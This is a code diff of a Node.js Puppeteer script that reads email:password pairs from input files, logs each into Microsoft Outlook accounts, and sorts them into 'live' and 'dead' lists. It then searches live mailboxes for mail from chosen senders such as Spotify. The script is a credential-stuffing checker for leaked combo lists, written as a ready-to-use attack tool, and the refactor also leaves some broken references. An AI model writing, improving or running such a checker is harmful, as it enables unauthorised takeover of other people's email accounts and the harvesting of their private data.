@@ -1,190 +1,170 @@
 const puppeteer = require("puppeteer");
-const fs = require("fs");
-const fsp = require("fs").promises;
+const fs = require("fs").promises;
 const path = require("path");
 const readline = require("readline");
 const chalk = require("chalk");
 
-// URLs as constants
 const LOGIN_URL = "https://login.live.com/login.srf?..."; // Your login URL
 const MAILBOX_URL = "https://outlook.live.com/owa/..."; // Your mailbox URL
-const SEARCH_INPUT_SELECTOR = "#topSearchInput";
-const SEARCH_BUTTON_SELECTOR = 'button[aria-label="Search"]';
-const STAY_SIGNED_IN_SELECTOR = "#kmsiTitle";
-const EMAIL_ERROR_SELECTOR = "#i0116Error";
-const PASSWORD_ERROR_SELECTOR = "#i0118Error";
 
-let isRunning = false;
+const stats = { total: 0, checked: 0, live: 0, dead: 0 };
 
-// Sleep function to pause execution
-const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// Stats to track the results
-const stats = {
-    total: 0,
-    checked: 0,
-    live: 0,
-    dead: 0,
-    startTime: null,
-};
-
-// Function to ensure the output folder exists
-const ensureFolderExists = async (folderPath) => {
+async function ensureFolderExists(folderPath) {
     try {
-        await fsp.access(folderPath);
+        await fs.access(folderPath);
     } catch {
-        await fsp.mkdir(folderPath, { recursive: true });
+        await fs.mkdir(folderPath, { recursive: true });
     }
-};
+}
 
-// Function to read filters from filter.txt
-const readFilters = async (filePath) => {
+async function readFilters(filePath) {
     try {
-        const data = await fsp.readFile(filePath, "utf8");
-        const filters = data
-            .trim()
-            .split("\n")
-            .filter((email) => email);
-        return filters.length > 0 ? filters : null;
+        const data = await fs.readFile(filePath, "utf8");
+        return data.trim().split("\n").filter(Boolean);
+    } catch {
+        return null;
+    }
+}
+
+async function askToProceedWithoutFilters() {
+    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+    return new Promise(resolve => {
+        rl.question("No filters found. Proceed without filtering? (y/n): ", answer => {
+            rl.close();
+            resolve(answer.toLowerCase() === "y");
+        });
+    });
+}
+
+async function waitForNavigation(page, options = {}) {
+    try {
+        await Promise.race([
+            page.waitForNavigation({ waitUntil: "networkidle0", timeout: 3000, ...options }),
+            new Promise(resolve => setTimeout(resolve, 3000))
+        ]);
     } catch (error) {
-        return null; // Return null if file is missing
+        console.log(chalk.yellow("Navigation timeout or error occurred. Continuing..."));
     }
-};
+}
 
-// Function to ask the user if they want to proceed without filters
-const askToProceedWithoutFilters = async () => {
-    const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout,
-    });
-    return new Promise((resolve) => {
-        rl.question(
-            "No filters found. Proceed without filtering? (y/n): ",
-            (answer) => {
-                rl.close();
-                resolve(answer.toLowerCase() === "y");
-            }
-        );
-    });
-};
-
-// Function to handle Puppeteer login and email search
-const checkEmailWithPuppeteer = async (
-    email,
-    password,
-    filters,
-    liveWriter,
-    deadWriter
-) => {
-    isRunning = true;
-
-    const browser = await puppeteer.launch({ headless: false });
-    const page = await browser.newPage();
-
+async function checkEmailWithPuppeteer(email, password, filters, liveWriter, deadWriter) {
+    let browser;
     try {
-        console.log(`Attempting login for: ${email}`);
+        browser = await puppeteer.launch({ headless: false });
+        const page = await browser.newPage();
+        await page.setDefaultNavigationTimeout(5000);
 
-        // Step 1: Navigate to the Microsoft login page
-        await page.goto(LOGIN_URL, { waitUntil: "networkidle2" });
+        console.log(chalk.blue(`Attempting login for: ${email}`));
 
-        // Step 2: Fill in the email and handle potential errors
-        await page.type("#i0116", email, { delay: 100 });
-        await page.click("#idSIButton9");
-
-        const emailError = await Promise.race([
-            page.waitForSelector("#i0118", { timeout: 5000 }).then(() => null),
-            page.waitForSelector(EMAIL_ERROR_SELECTOR, { timeout: 5000 }),
+        await page.goto(LOGIN_URL, { waitUntil: "networkidle0" });
+        await page.type("#i0116", email);
+        await Promise.all([
+            page.click("#idSIButton9"),
+            waitForNavigation(page)
         ]);
 
-        if (emailError) {
+        try {
+            await page.waitForSelector("#i0116Error", { timeout: 1000 });
             const errorMsg = await page.$eval(
                 EMAIL_ERROR_SELECTOR,
                 (el) => el.textContent
             );
             console.log(chalk.red(`❌ Email error: ${errorMsg}`));
             deadWriter.write(`${email}:${password} | Email Error: ${errorMsg}\n`);
-            isRunning = false; // Set isRunning to false when done
-            return isRunning;
+            return;
+        } catch (e) {
+            // No email error, proceed
         }
 
-        // Step 3: Fill in the password and handle potential errors
-        await page.type("#i0118", password, { delay: 100 });
-        // await page.click("#idSIButton9");
+        const passwordSelector = "#i0118";
+        try {
+            await page.waitForSelector(passwordSelector, { timeout: 1000 });
+        } catch {
+            console.log(chalk.red(`Password field not found for ${email}`));
+            deadWriter.write(`${email}:${password} | Error: Password field not found\n`);
+            return;
+        }
 
-        const passwordError = await Promise.race([
-            page.waitForNavigation({ waitUntil: "networkidle2" }).then(() => null),
-            page.waitForSelector(PASSWORD_ERROR_SELECTOR, { timeout: 5000 }),
+        await page.type(passwordSelector, password);
+        await Promise.all([
+            page.click("#idSIButton9"),
+            waitForNavigation(page)
         ]);
 
-        if (passwordError) {
+
+        const PASSWORD_ERROR_SELECTOR = "#i0118Error";
+        try {
+            await page.waitForSelector(PASSWORD_ERROR_SELECTOR, { timeout: 1000 });
             const errorMsg = await page.$eval(
                 PASSWORD_ERROR_SELECTOR,
                 (el) => el.textContent
             );
             console.log(chalk.red(`❌ Password error: ${errorMsg}`));
             deadWriter.write(`${email}:${password} | Password Error: ${errorMsg}\n`);
-            isRunning = false; // Set isRunning to false when done
-            return isRunning;
+            return;
+        } catch (e) {
+            // No password error, proceed
         }
 
-        // Step 4: Handle "Stay Signed In?" prompt
-        await page.waitForSelector("#kmsiTitle");
-        await page.click("#acceptButton");
-        await page.waitForNavigation({ waitUntil: "networkidle2" });
-        console.log(chalk.green(`✅ Login successful for: ${email}`));
+        const currentUrl = page.url();
+        console.log(currentUrl)
+        if (currentUrl.includes("/signin") || currentUrl.includes("recover?") || currentUrl.includes("Abuse?") || currentUrl.includes("cancel?")) {
+            console.log(chalk.red(`Login failed for ${email}`));
+            deadWriter.write(`${email}:${password} | Error: Login failed\n`);
+            return;
+        }
 
-        // Step 5: Perform email search and filter if filters exist
+        // Handle "Stay signed in?" prompt if it appears
+        try {
+            await page.waitForSelector('#acceptButton', { timeout: 3000 });
+            await Promise.all([
+                page.click('#acceptButton'),
+                waitForNavigation(page)
+            ]);
+        } catch {
+        }
+
+        console.log(chalk.green(`Login successful for ${email}`));
+
+        // Perform email search and filtering here if needed
         await page.goto(MAILBOX_URL, { waitUntil: "networkidle0" });
-        await page.waitForSelector("#topSearchInput");
 
-        let liveEntry = `${email}:${password}`;
-        if (filters && filters.length > 0) {
-            for (const filterEmail of filters) {
-                await page.waitForNavigation({ waitUntil: "networkidle2" });
-                console.log(`Searching for emails from: ${filterEmail}`);
-                await page.type("#topSearchInput", `from:${filterEmail}`);
-                await page.click('button[class="nUPgy"]');
-                await page.click('button[aria-label="Search"]');
-
-                await sleep(1000); // Shortened sleep for testing purposes
-                try {
-                    await page.waitForSelector(".jGG6V.gDC9O", { timeout: 5000 });
-                    const results = await page.$$eval(
-                        ".jGG6V.gDC9O",
-                        (elements) => elements.length
-                    );
-                    liveEntry += ` | ${results} emails found from ${filterEmail}`;
-                } catch (e) {
-                    liveEntry += ` | No emails found from ${filterEmail}`;
-                }
-                await page.evaluate(
-                    () => (document.querySelector("#topSearchInput").value = "")
-                );
-            }
-        } else {
-            liveEntry += " | No filters applied.";
+        const searchboxselector = '#topSearchInput';
+        try {
+            await page.waitForSelector(searchboxselector, { timeout: 3000 });
+            await Promise.all([
+                page.type(searchboxselector, 'from:"no-reply@spotify.com"'),
+                page.click('button[aria-label="Search"]', { timeout: 2000 }),
+                waitForNavigation(page)
+            ]);
+        } catch {
         }
+
+        try {
+            await page.waitForSelector('.jGG6V.gDC9O', { timeout: 5000 });
+            const results = await page.$$eval('.jGG6V.gDC9O', elements => elements.length);
+            console.log(`Found ${results} result(s).`);
+        } catch (e) {
+            console.log('No search results found or search timed out.');
+        }
+
 
         stats.live++;
-        liveWriter.write(liveEntry + "\n");
-        console.log(chalk.green(`✅ ${liveEntry}`));
-        isRunning = false; // Set isRunning to false when done
-        return isRunning;
+        liveWriter.write(`${email}:${password}\n`);
+
     } catch (error) {
-        stats.dead++;
-        console.error(`Login failed for ${email}:`, error);
+        console.error(chalk.red(`Error for ${email}:`, error.message));
         deadWriter.write(`${email}:${password} | Error: ${error.message}\n`);
-        isRunning = false; // Set isRunning to false when done
-        return isRunning;
+        stats.dead++;
     } finally {
-        await page.close();
-        await browser.close();
+        if (browser) await browser.close();
         stats.checked++;
     }
-};
+}
 
-// Function to process emails from input files
-const processFile = async (inputFile, filters) => {
+async function processFile(inputFile, filters) {
     const outputFolder = path.join(process.cwd(), "output");
     await ensureFolderExists(outputFolder);
 
@@ -192,51 +172,34 @@ const processFile = async (inputFile, filters) => {
     const liveFile = path.join(outputFolder, `${baseName}_live.txt`);
     const deadFile = path.join(outputFolder, `${baseName}_dead.txt`);
 
-    const liveWriter = fs.createWriteStream(liveFile, { flags: "a" });
-    const deadWriter = fs.createWriteStream(deadFile, { flags: "a" });
+    const liveWriter = await fs.open(liveFile, "a");
+    const deadWriter = await fs.open(deadFile, "a");
 
-    const data = await fsp.readFile(inputFile, "utf8");
+    const data = await fs.readFile(inputFile, "utf8");
     const lines = data.trim().split("\n");
     stats.total += lines.length;
 
     for (let line of lines) {
         const [email, password] = line.split(":");
-
-        // Wait until isRunning becomes false
-        if (!isRunning) {
-            isRunning = await checkEmailWithPuppeteer(
-                email,
-                password,
-                filters,
-                liveWriter,
-                deadWriter
-            );
-        }
-
-        console.log(`Task completed for ${email}`);
+        await checkEmailWithPuppeteer(email.trim(), password.trim(), filters, liveWriter, deadWriter);
         await sleep(1000); // Add delay between requests
     }
 
-    liveWriter.end();
-    deadWriter.end();
-};
+    await liveWriter.close();
+    await deadWriter.close();
+}
 
-// Main function to manage the workflow
-const main = async () => {
+async function main() {
     const filters = await readFilters(path.join(__dirname, "filter.txt"));
 
-    if (!filters) {
-        const proceed = await askToProceedWithoutFilters();
-        if (!proceed) {
-            console.log(
-                chalk.red("Process aborted due to missing or empty filter.txt.")
-            );
-            return;
-        }
+    if (!filters && !(await askToProceedWithoutFilters())) {
+        console.log(chalk.red("Process aborted due to missing or empty filter.txt."));
+        return;
     }
 
-    const inputFiles = await fsp.readdir(path.join(process.cwd(), "input"));
-    const txtFiles = inputFiles.filter((file) => file.endsWith(".txt"));
+    const inputFolder = path.join(process.cwd(), "input");
+    const inputFiles = await fs.readdir(inputFolder);
+    const txtFiles = inputFiles.filter(file => file.endsWith(".txt"));
 
     if (txtFiles.length === 0) {
         console.error(chalk.red("No .txt files found in the input folder."));
@@ -244,10 +207,11 @@ const main = async () => {
     }
 
     for (const inputFile of txtFiles) {
-        await processFile(path.join("input", inputFile), filters);
+        await processFile(path.join(inputFolder, inputFile), filters);
     }
 
     console.log(chalk.blue("\nAuthentication process completed."));
-};
+    console.log(chalk.cyan(`Total: ${stats.total}, Checked: ${stats.checked}, Live: ${stats.live}, Dead: ${stats.dead}`));
+}
 
 main().catch(console.error);
